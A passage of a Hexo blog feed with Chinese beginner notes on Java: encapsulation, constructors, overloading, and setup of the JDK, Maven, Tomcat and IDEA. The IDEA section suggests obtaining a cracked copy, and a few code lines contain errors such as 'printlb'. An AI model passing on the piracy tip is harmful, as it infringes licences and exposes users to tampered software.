class_">Main</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">worker</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">worker</span>();<br><br>        me.shuo();<br><br>        me.zuo();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>注意：Main里面是worker</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121318.png" alt="image-20240410171654198"></p><h2 id="4-封装"><a href="#4-封装" class="headerlink" title="4.封装"></a>4.封装</h2><p>将对象的内部状态和实现细节隐藏起来，只对外提供访问接口。</p><p>通过访问修饰符实现</p><p>解决：对象安全性和灵活性。</p><p>使对象能够以受控制的方式按外部访问和修改。 </p><p>get</p><p>set</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br><br>    <span class="hljs-comment">//getter方法，用于获取name属性</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br>    <span class="hljs-comment">//setter方法，用于设置name属性值，并进行非空验证</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String newName)</span> &#123;<br>        <span class="hljs-keyword">if</span> (newName != <span class="hljs-literal">null</span> &amp;&amp; !newName.isEmpty())&#123;<br>            <span class="hljs-built_in">this</span>.name=newName;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Name cannot be null or empty&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//get方法，获取age</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.age;<br>    &#125;<br><span class="hljs-comment">//设置age</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> newAge)</span>&#123;<br>        <span class="hljs-keyword">if</span> (newAge &gt;= <span class="hljs-number">0</span> &amp;&amp; newAge &lt;= <span class="hljs-number">100</span>)&#123;<br>            <span class="hljs-built_in">this</span>.age = newAge;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Age must be between 0 and 100&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//创建个Person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-comment">//设置属性</span><br>        person.setName(<span class="hljs-string">&quot;e1even&quot;</span>);<br>        person.setAge(<span class="hljs-number">20</span>);<br><span class="hljs-comment">//get并输出</span><br>        System.out.println(<span class="hljs-string">&quot;名字：&quot;</span>+person.getName());<br>        System.out.println(<span class="hljs-string">&quot;年龄：&quot;</span>+person.getAge());<br><span class="hljs-comment">//设置无效值</span><br>        person.setName(<span class="hljs-string">&quot;&quot;</span>);<br>        person.setAge(<span class="hljs-number">10086</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121354.png" alt="image-20240410212039791"></p><h2 id="5-构造函数"><a href="#5-构造函数" class="headerlink" title="5.构造函数"></a>5.构造函数</h2><p>特殊的方法，与类同名，没有返回类型，在对象被创建时调用，用于<strong>初始化</strong>操作。</p><p>目的：确保对象在被使用之前处于一个合理的状态</p><p>如果你没有为类定义任何构造函数，JAVA编译器会为你生成一个默认的无参数构造函数，并执行以下操作：</p><p>​·将类的实例变量初始化为默认值（0，false，null）</p><p>​·如果是继承，调用父类无参数构造函数</p><p>分类：有参&#x2F;无参</p><p><strong>如果你显式地提供了自定义的构造函数（无论是有参数的还是无参数的），并且没有提供任何无参数构造函数，那么默认的无参数构造函数就不再自动生成。</strong></p><p><strong>也就是说除非目标类显示的自定义了无参构造函数，否则如果目标类只定义了有参构造函数的话，那就不会默认生成无参构造函数了。</strong></p><p>解决的问题：</p><p>构造函数解决了对象初始化的问题。通过构造函数，可以为对象的属性赋予初始值，执行必要的设置，使对象能够在创建时就具备正确的状态。</p><p>无参:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//构造函数初始值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;e1even&quot;</span>;<br>        <span class="hljs-built_in">this</span>.age = <span class="hljs-number">20</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//实例化</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br>        <span class="hljs-comment">//获取信息并打印</span><br>        System.out.println(<span class="hljs-string">&quot;name:&quot;</span> + person.getName() + <span class="hljs-string">&quot; age:&quot;</span> + person.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121324.png" alt="image-20240410214942628"></p><p>有参:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//有参构造函数，接受命名和年龄</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//实例化</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;e1even&quot;</span>,<span class="hljs-number">20</span>);<br><br>        <span class="hljs-comment">//获取信息并打印</span><br>        System.out.println(<span class="hljs-string">&quot;name:&quot;</span> + me.getName() + <span class="hljs-string">&quot; age:&quot;</span> + me.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>出来的效果是一样的</p><h3 id="继承中的构造函数"><a href="#继承中的构造函数" class="headerlink" title="继承中的构造函数"></a>继承中的构造函数</h3><p><strong>默认情况：</strong></p><ul><li>如果父类（基类）有一个无参数的构造函数，子类（派生类）会自动继承这个无参数构造函数。</li><li>如果子类没有显式定义构造函数，编译器会默认生成一个无参数构造函数，并在其中调用父类的无参数构造函数。</li></ul><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span> </span>&#123;<br>    <span class="hljs-comment">// 父类有一个无参数构造函数</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Animal</span> </span>&#123;<br>    <span class="hljs-comment">// 子类没有显式定义构造函数，编译器默认生成一个无参数构造函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>父类有有参数构造函数：</strong></p><ul><li>如果父类只提供了有参数的构造函数，子类需要显式定义构造函数，并通过<code>super()</code>调用适当的父类构造函数。此时 <code>super()</code>方法是必须的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// 父类有一个有参数构造函数</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name, String breed)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name); <span class="hljs-comment">// 调用父类的有参数构造函数</span><br>        <span class="hljs-comment">// 初始化子类特有的属性</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>子类提供无参数构造函数：</strong></p><ul><li>如果父类没有提供无参数构造函数，但子类需要使用无参数构造函数，子类需要显式提供无参数构造函数，并通过<code>super()</code>调用适当的父类构造函数。此时 <code>super()</code>方法是必须的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// 父类有一个有参数构造函数</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;DefaultName&quot;</span>); <span class="hljs-comment">// 调用父类的有参数构造函数</span><br>        <span class="hljs-comment">// 子类提供无参数构造函数，并在其中调用父类构造函数</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总的来说，继承和构造函数的关系取决于父类的构造函数情况。在设计时，需要考虑如何在子类中正确地初始化父类的状态。</p><h2 id="6-函数方法重载"><a href="#6-函数方法重载" class="headerlink" title="6.函数方法重载"></a>6.函数方法重载</h2><p>具有相同的<strong>方法名</strong>但具有不同的<strong>参数列表</strong></p><p>编译器根据方法的参数数量，类型或顺序来选择合适的方法</p><p>如计算器可以同时有整型，浮点型，字符型（Π）的加法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span>&#123;<br><span class="hljs-comment">//重载</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">calc</span> <span class="hljs-variable">mycalc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">calc</span>();<br>        System.out.printlb(mycalc.add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>        <span class="hljs-comment">//后面以此类推</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-构造函数中的重载"><a href="#7-构造函数中的重载" class="headerlink" title="7.构造函数中的重载"></a>7.构造函数中的重载</h2><p>概念：</p><p>构造函数的重载是指在同一个类中定义多个构造函数，他们具有相同的名称但参数列表不同</p><p>解决的问题：</p><p>构造函数的重载解决了不同场景下对象初始化需求不同的问题。通过提供多个构造函数，使得用户能够选择适合自己需求的初始化方式。</p><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="HASHMAP"><a href="#HASHMAP" class="headerlink" title="HASHMAP"></a>HASHMAP</h2><p>常用集合类</p><p>存储Key-Value键值对的集合</p><p>实现了Map接口</p><p>核心思想是通过对散列算法将键映射到存储桶</p><p><strong>键值对</strong>常见的数据结构，通常同于表示关联关系。</p><p>包含两部分：键（key）和值（value）</p><p>键是唯一的，通过键可以访问对应的值</p><p>常用get和put</p><p>一个获取，一个存入 </p><h2 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h2><p>java.lang包中的一个类，用于单线程环境下对字符串进行可变操作，避免使用String类时</p><h2 id="SringBuffer"><a href="#SringBuffer" class="headerlink" title="SringBuffer"></a>SringBuffer</h2><p>与StringBuilder类似</p><h2 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h2><p>输入输出流处理输入输出机制</p><p>分为字节流和字符流</p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>所有类的根类</p><p>每个类都是Object类的子类，定义了一些基本的方法，如toString、equals和hashCode</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础-环境配置</title>
    <link href="/2024/06/14/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/06/14/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="1-JDK"><a href="#1-JDK" class="headerlink" title="1.JDK"></a>1.JDK</h2><h3 id="什么是JDK"><a href="#什么是JDK" class="headerlink" title="什么是JDK"></a>什么是JDK</h3><p><a href="https://blog.csdn.net/qing_gee/article/details/102792349">什么是 JDK？_jdk是什么-CSDN博客</a></p><h3 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h3><p><strong><a href="https://www.oracle.com/java/technologies/downloads/#jdk22-windows">Java Downloads | Oracle</a></strong></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406141101689.png"></p><p>（有新版本就安新版本）</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406141105667.png"></p><p>在学习java的时候，我们可能需要经常切换java的版本，下面是一个.bat文件，根据自己的情况进行配置，就可以做到快捷切换java版本</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">set</span> JAVA_HOME=C:\Program Files\Java\jdk-<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">Path</span>=<span class="hljs-variable">%JAVA_HOME%</span>\bin;<span class="hljs-variable">%Path%</span><br><span class="hljs-built_in">echo</span> Java <span class="hljs-number">1</span>.<span class="hljs-number">8</span> activated.<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141114899.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141114674.png" alt="image-20240408210331991"></p><h2 id="2-MYSQL"><a href="#2-MYSQL" class="headerlink" title="2.MYSQL"></a>2.MYSQL</h2><p><a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p><p>下载上述软件快速配置mysql，且利于快速切换版本</p><h2 id="3-MAVEN"><a href="#3-MAVEN" class="headerlink" title="3.MAVEN"></a>3.MAVEN</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Maven 是一个项目管理工具，它包含了一个项目对象模型（Project Object Model），反<br>映在配置中，就是一个 pom.xml 文件。是一组标准集合，一个项目的生命周期、一个<br>依赖管理系统，另外还包括定义在项目生命周期阶段的插件(plugin)以及目标(goal)。<br>当我们使用 Maven 的使用，通过一个自定义的项目对象模型，pom.xml 来详细描述我<br>们自己的项目。<br>简单来说，我们开发一个JavaWeb项目是需要加载很多依赖的，使用Maven可以便于管<br>理这些依赖。</p><p>pom.xml</p><p>POM是项目对象模型(Project Object Model)的简称,它是Maven项目中的文件，使用XML表<br>示，名称叫做 pom.xml 。该文件用于管理：源代码、配置文件、开发者的信息和角<br>色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。Maven项<br>目中必须包含 pom.xml 文件。<br>需要导入的依赖应该在 pom.xml 中进行配置与填写。比如导入某些依赖，如下图所<br>示：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141130167.png"></p><p>project-  project 是 pom.xml 中描述符的根。 </p><p>modelVersion -  modelVersion 指定 pom.xml 符合哪个版本的描述符。maven 2  和 3 只能为 4.0.0。</p><p>parent - maven 支持继承功能。子 POM 可以使用  其配置。 </p><p>dependencies - 在dependencise中进行依赖配置 parent 指定父 POM ，然后继承 </p><p>groupId - 团体、组织的标识符。团体标识的约定是，它以创建这个项目的组织名称 的逆向域名(reverse domain name)开头。一般对应着 java 的包结构。 </p><p>artifactId -  单独项目的唯一标识符。比如我们的 tomcat、commons 等。不要在  artifactId 中包含点号(.)。 </p><p>version -  版本信息。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://www.runoob.com/maven/maven-setup.html">Maven 环境配置 | 菜鸟教程 (runoob.com)</a></p><p>值得一提的是，IDEA内置了MAVEN</p><h3 id="加速配置"><a href="#加速配置" class="headerlink" title="加速配置"></a>加速配置</h3><p>镜像配置</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141115511.png" alt="image-20240409114125175"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141115970.png" alt="image-20240409114207098"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置国内源下载一些依赖组件会非常快，但会有极个别情况，有些组件使用国内源无法<br>下载，则需要再更改配置，大家留有印象就好。<strong>（意思就是能用上面那种方法就用上面那种）</strong><br>①、访问 c:\Users\当前用户.m2 目录，当前用户文件夹需要根据当前用户来定，如<br>下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116388.png" alt="image-20240408224429153"></p><p>②、打开 settings.xml 文件，复制粘贴以下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0</span></span><br><span class="hljs-string"><span class="hljs-tag">http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pluginGroups</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pluginGroups</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">proxies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">proxies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>C:\Users\当前用户\.m2\repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servers</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeProfile</span>&gt;</span>nexus<span class="hljs-tag">&lt;/<span class="hljs-name">activeProfile</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="4-TomCat"><a href="#4-TomCat" class="headerlink" title="4.TomCat"></a>4.TomCat</h2><p><a href="https://tomcat.apache.org/">Apache Tomcat® - Welcome!</a></p><p>这个，然后是tomcat8</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116496.png" alt="image-20240409115050063"></p><h2 id="5-IDEA"><a href="#5-IDEA" class="headerlink" title="5.IDEA"></a>5.IDEA</h2><p><a href="https://www.jetbrains.com/zh-cn/idea/download/download-thanks.html?platform=windows">感谢您下载IntelliJ IDEA！ (jetbrains.com)</a></p><p>这个是专业版，你可以使用三十天的试用，或是到网上找破解，某鱼也有</p><p>如果你是学生</p><p><a href="https://www.jetbrains.com/shop/eform/students">JetBrains 学习产品</a></p><p>我更推荐使用教育优惠，你可以通过教育邮箱&#x2F;学信网（学生证）进行申请，使你在JetBrains全部产品免费使用</p><h2 id="6-创建项目"><a href="#6-创建项目" class="headerlink" title="6.创建项目"></a>6.创建项目</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141117212.png" alt="img"></p><h2 id="7-Ubuntu环境配置"><a href="#7-Ubuntu环境配置" class="headerlink" 